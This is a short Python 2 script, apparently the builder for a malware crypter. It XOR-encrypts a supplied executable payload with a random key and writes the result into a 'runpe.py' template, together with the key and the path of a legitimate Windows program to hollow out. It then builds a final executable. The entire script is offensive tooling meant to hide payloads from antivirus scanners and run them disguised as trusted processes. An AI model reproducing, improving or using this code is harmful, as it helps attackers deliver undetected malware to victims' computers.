#!/usr/bin/env python

# This script generates a random key
# and encrypt the payload with it 
# then put it in a new file "runpe_final.py"

from itertools import cycle, izip
from binascii import unhexlify
import sys, uuid, re, os


# function that xors each byte of the payload with a random key
def xor(s, key):
    key = cycle(key)
    return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(s, key))

# check for arguments
if len(sys.argv) != 3:
	print "Usage: crypt.py Payload.exe C:\\windows\\Legitim.exe"
	exit(1)

linelength = 16
path = sys.argv[2]
path = "'"+path.replace("\\","\\\\")+"'"

# generate random key 
random = str(uuid.uuid4().get_hex()[0:10])

# Get the payload
f = open(sys.argv[1], "rb")
payload = f.read()
f.close()

# xor the payload with the random key
xored = xor(payload, random)

# Format the payload
hexarray = ["{:02x}".format(ord(c)) for c in xored]
formatted = ""
for byte in hexarray :
	formatted += "\\x"+byte

lines = [formatted[x:x+linelength*4] for x in range(0, len(formatted) ,linelength*4)]
output = ""
for line in lines :
	output += '"'+line+'"\n'

# Get the runpe.py code
f = open("runpe.py", 'r')
code = f.read()
f.close()

# Make changes in the runpe.py
var = re.sub("#Random Key", "randomkey = \'"+str(random)+'\'', code)
var1 = re.sub("#File Path", "filepath = "+path, var)
varfinal = re.sub("#Encrypted Buffer", "encryptedbuff = ("+output+")", var1)

# Create the final script
final = open("runpe_final.py", 'w')
final.write(varfinal)
final.close()

# Launch setup.py to make the final executable
os.system('setup.py')
print "\n[+] final file created"